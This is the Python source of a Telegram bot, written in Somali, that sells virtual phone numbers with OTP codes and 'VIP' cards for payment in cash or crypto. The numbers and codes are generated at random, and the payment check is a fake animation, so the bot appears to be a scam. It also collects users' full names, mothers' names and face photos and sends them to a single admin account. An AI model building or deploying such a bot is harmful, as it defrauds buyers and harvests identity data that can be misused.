import os
import random
import asyncio
import logging
from aiogram import Bot, Dispatcher, F
from aiogram.types import *
from aiogram.filters import Command
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import StatesGroup, State

# ================= CONFIG =================
BOT_TOKEN = os.getenv("BOT_TOKEN")
ADMIN_ID = 7983838654

bot = Bot(BOT_TOKEN)
dp = Dispatcher(storage=MemoryStorage())
logging.basicConfig(level=logging.INFO)

users = {}

# ================= STATES =================
class CardState(StatesGroup):
    full_name = State()
    mother = State()
    photo = State()
    payment_screenshot = State()

class CodeState(StatesGroup):
    code = State()

class AskState(StatesGroup):
    message = State()

# ================= HELPERS =================
def normal_number():
    return "+25263" + "".join(str(random.randint(0, 9)) for _ in range(7))

def vip_number():
    d = str(random.randint(4, 9))
    return "+25263" + d*3 + str(random.randint(0, 9)) + d*3

def generate_code():
    return "".join(random.choices("0123456789", k=6))

async def checking_animation(msg):
    for text in ["CHECKING.", "CHECKING..", "CHECKING...", "CHECKING...."]:
        await asyncio.sleep(1)
        await msg.edit_text(text)

# ================= START =================
@dp.message(Command("start"))
async def start(msg: Message):
    kb = ReplyKeyboardMarkup(
        keyboard=[
            [KeyboardButton(text="New Order"),
             KeyboardButton(text="Check Code")]
        ],
        resize_keyboard=True
    )
    await msg.answer("Ku soo dhawoow Service Bot 🤖", reply_markup=kb)

# ================= NEW ORDER =================
@dp.message(F.text == "New Order")
async def new_order(msg: Message):
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="VIRTUAL ($0.8)", callback_data="virtual")],
        [InlineKeyboardButton(text="CARD", callback_data="card")]
    ])
    await msg.answer("Dooro adeeg:", reply_markup=kb)

# =====================================================
# ================= VIRTUAL FLOW ======================
# =====================================================

@dp.callback_query(F.data == "virtual")
async def virtual(call: CallbackQuery):
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="WhatsApp", callback_data="v_WhatsApp")],
        [InlineKeyboardButton(text="TikTok", callback_data="v_TikTok")],
        [InlineKeyboardButton(text="Google", callback_data="v_Google")],
        [InlineKeyboardButton(text="Telegram", callback_data="v_Telegram")]
    ])
    await call.message.edit_text("Dooro Platform:", reply_markup=kb)

@dp.callback_query(F.data.startswith("v_"))
async def virtual_process(call: CallbackQuery):
    number = normal_number()
    code = generate_code()

    users[call.from_user.id] = {
        "type": "virtual",
        "platform": call.data,
        "number": number,
        "code": code,
        "amount": "$0.8"
    }

    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="LOCAL", callback_data="v_pay_local")],
        [InlineKeyboardButton(text="CRYPTO", callback_data="v_pay_crypto")]
    ])

    await call.message.edit_text(
        f"Number: {number}\n"
        f"Code: {code}\n"
        f"Qiimaha: $0.8\n\n"
        f"Dooro Payment Method:",
        reply_markup=kb
    )

# =====================================================
# ================= CARD FLOW =========================
# =====================================================

@dp.callback_query(F.data == "card")
async def card(call: CallbackQuery):
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="VIP - $15", callback_data="vip")],
        [InlineKeyboardButton(text="NORMAL - $1", callback_data="normal")]
    ])
    await call.message.edit_text("Dooro Card Type:", reply_markup=kb)

@dp.callback_query(F.data.in_(["vip", "normal"]))
async def card_type(call: CallbackQuery, state: FSMContext):
    number = vip_number() if call.data == "vip" else normal_number()

    users[call.from_user.id] = {
        "type": "card",
        "level": call.data,
        "number": number
    }

    await call.message.answer("Fadlan geli Magacaaga Saddexan:")
    await state.set_state(CardState.full_name)

@dp.message(CardState.full_name)
async def get_name(msg: Message, state: FSMContext):
    if len(msg.text.split()) < 3:
        await msg.answer("Magac Saddexan sax ah geli.")
        return

    users[msg.from_user.id]["name"] = msg.text
    await msg.answer("Geli Magaca Hooyada:")
    await state.set_state(CardState.mother)

@dp.message(CardState.mother)
async def get_mother(msg: Message, state: FSMContext):
    users[msg.from_user.id]["mother"] = msg.text
    await msg.answer("Soo dir Sawirkaaga (Waji kaliya):")
    await state.set_state(CardState.photo)

@dp.message(CardState.photo, F.photo)
async def get_photo(msg: Message, state: FSMContext):
    # Halkan waxaad ku dari kartaa Face detection mustaqbalka
    users[msg.from_user.id]["photo"] = msg.photo[-1].file_id

    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="LOCAL", callback_data="pay_local")],
        [InlineKeyboardButton(text="CRYPTO", callback_data="pay_crypto")]
    ])

    await msg.answer("Dooro Payment Method:", reply_markup=kb)

# =====================================================
# ================= LOCAL PAYMENT ====================
# =====================================================

@dp.callback_query(F.data == "pay_local")
async def pay_local(call: CallbackQuery):
    user_data = users[call.from_user.id]
    number = "+252907868526" if user_data.get("type") == "card" else user_data.get("number")

    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="CONFIRM", callback_data="confirm_pay")],
        [InlineKeyboardButton(text="CANCEL", callback_data="cancel")],
        [InlineKeyboardButton(text="ASK", callback_data="ask_user")]
    ])

    await call.message.edit_text(
        f"Numberka lacagta u dir:\n{number}",
        reply_markup=kb
    )

@dp.callback_query(F.data == "confirm_pay")
async def confirm_pay(call: CallbackQuery, state: FSMContext):
    msg = await call.message.edit_text("Checking Payment... ⏳")
    await checking_animation(msg)
    await call.message.answer("Fadlan soo dir Screenshot Payment si loo xaqiijiyo:")
    await state.set_state(CardState.payment_screenshot)

@dp.callback_query(F.data == "cancel")
async def cancel(call: CallbackQuery):
    await call.message.edit_text("Order Cancelled ❌")

# =====================================================
# ================= CRYPTO PAYMENT ===================
# =====================================================

@dp.callback_query(F.data == "pay_crypto" or F.data == "v_pay_crypto")
async def pay_crypto(call: CallbackQuery):
    bnb = "0x98ffcb29a4fc182d461ebdba54648d8fe24597ac"
    usdt = "0x98ffcb29a4fc182d461ebdba54648d8fe24597ac"

    text = (
        "Send Crypto:\n\n"
        f"BNB:\n`{bnb}`\n\n"
        f"USDT-BEP20:\n`{usdt}`\n\n"
        "Taabo address-ka si uu auto-copy u noqdo."
    )

    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="BNB COPY", url=f"tg://msg?text={bnb}")],
        [InlineKeyboardButton(text="USDT COPY", url=f"tg://msg?text={usdt}")]
    ])

    msg = await call.message.edit_text(text, parse_mode="Markdown")
    
    # 5 sec countdown reminder
    for i in range(5, 0, -1):
        await asyncio.sleep(1)
        await msg.edit_text(f"{text}\n⏳ {i} sec")

# =====================================================
# ================= SCREENSHOT TO ADMIN ==============
# =====================================================

@dp.message(CardState.payment_screenshot, F.photo)
async def receive_screenshot(msg: Message, state: FSMContext):
    uid = msg.from_user.id
    users[uid]["screenshot"] = msg.photo[-1].file_id

    await msg.answer("Payment Screenshot waa la helay, Waanu xaqiijin doona ⏳")
    await state.clear()

    user_data = users[uid]

    kb_admin = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="CONFIRM", callback_data=f"admin_confirm_{uid}")],
        [InlineKeyboardButton(text="REJECT", callback_data=f"admin_reject_{uid}")],
        [InlineKeyboardButton(text="ASK", callback_data=f"admin_ask_{uid}")]
    ])

    # Sawirka waji + payment info
    await bot.send_photo(
        ADMIN_ID,
        user_data["photo"],
        caption=(
            f"Payment Request\n\n"
            f"User: {uid}\n"
            f"Type: {user_data['type']}\n"
            f"Platform: {user_data.get('platform','N/A')}\n"
            f"Level: {user_data.get('level','N/A')}\n"
            f"Number: {user_data['number']}\n"
            f"Name: {user_data.get('name','N/A')}\n"
            f"Mother: {user_data.get('mother','N/A')}\n"
            f"Payment: {user_data.get('amount','N/A')}"
        ),
        reply_markup=kb_admin
    )

    # Screenshot separately
    await bot.send_photo(
        ADMIN_ID,
        user_data["screenshot"],
        caption="Payment Screenshot"
    )

# =====================================================
# ================= ADMIN ACTIONS ====================
# =====================================================

@dp.callback_query(F.data.startswith("admin_confirm_"))
async def admin_confirm(call: CallbackQuery):
    uid = int(call.data.split("_")[2])
    if uid not in users:
        await call.answer("User not found")
        return

    code = generate_code()
    users[uid]["code"] = code

    # Dir user-ka code
    if users[uid]["type"] == "card":
        kb = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="CHECK CODE", callback_data="go_check")]
        ])
        await bot.send_message(
            uid,
            f"Payment Confirmed ✅\n\nCode-kan ku qor CHECK CODE:\n\n{code}",
            reply_markup=kb
        )
    elif users[uid]["type"] == "virtual":
        await bot.send_message(
            uid,
            f"OTP Ready ✅\nNumber: {users[uid]['number']}\nCode: {code}"
        )

    await call.message.edit_text("Approved ✅")

@dp.callback_query(F.data.startswith("admin_reject_"))
async def admin_reject(call: CallbackQuery):
    uid = int(call.data.split("_")[2])
    if uid in users:
        await bot.send_message(
            uid,
            "Codsigaaga waa la diiday ❌\nFadlan Lacagta ku dir Numberkan si loo xaqiijiyo:\n+252907868526"
        )
    await call.message.edit_text("Rejected ❌")

@dp.callback_query(F.data.startswith("admin_ask_"))
async def admin_ask(call: CallbackQuery, state: FSMContext):
    uid = int(call.data.split("_")[2])
    await call.message.answer("Fariin qor user-ka:")
    await state.update_data(ask_user_id=uid)
    await state.set_state(AskState.message)

@dp.message(AskState.message)
async def send_ask(msg: Message, state: FSMContext):
    data = await state.get_data()
    uid = data.get("ask_user_id")
    if uid:
        await bot.send_message(uid, f"Message from Admin:\n{msg.text}")
        await msg.answer("Fariinta waa la diray ✅")
    await state.clear()

# =====================================================
# ================= CHECK CODE FLOW ==================
# =====================================================

@dp.callback_query(F.data == "go_check")
async def go_check(call: CallbackQuery, state: FSMContext):
    await call.message.answer("Geli Code-kaaga:")
    await state.set_state(CodeState.code)

@dp.message(F.text == "Check Code")
async def check_code_menu(msg: Message, state: FSMContext):
    await msg.answer("Geli Code-kaaga:")
    await state.set_state(CodeState.code)

@dp.message(CodeState.code)
async def check_code_process(msg: Message, state: FSMContext):
    uid = msg.from_user.id
    code_input = msg.text.strip()

    if uid in users and users[uid].get("type") in ["card", "virtual"]:
        if users[uid].get("code") == code_input:
            await msg.answer(
                f"Code Confirmed ✅\nNumber-kaaga waa:\n{users[uid]['number']}"
            )
        else:
            await msg.answer("Code Khaldan ❌")
    else:
        await msg.answer("Ma jiro dalab la helay.")

    await state.clear()

# =====================================================
# ================= FORWARD ADDITIONAL INFO ===========
# =====================================================

@dp.message()
async def forward_card_to_admin(msg: Message):
    uid = msg.from_user.id

    if uid in users and users[uid].get("type") == "card":
        data = users[uid]

        if "screenshot" in data:
            kb_admin = InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton("CONFIRM", callback_data=f"admin_confirm_{uid}")],
                [InlineKeyboardButton("REJECT", callback_data=f"admin_reject_{uid}")],
                [InlineKeyboardButton("ASK", callback_data=f"admin_ask_{uid}")]
            ])

            await bot.send_photo(
                ADMIN_ID,
                data["photo"],
                caption=(
                    f"Card Request\n\n"
                    f"User: {uid}\n"
                    f"Level: {data['level']}\n"
                    f"Number: {data['number']}\n"
                    f"Name: {data['name']}\n"
                    f"Mother: {data['mother']}"
                ),
                reply_markup=kb_admin
            )

            await bot.send_photo(
                ADMIN_ID,
                data["screenshot"],
                caption="Payment Screenshot"
            )

# =====================================================
# ================= MAIN RUN =========================
# =====================================================

async def main():
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
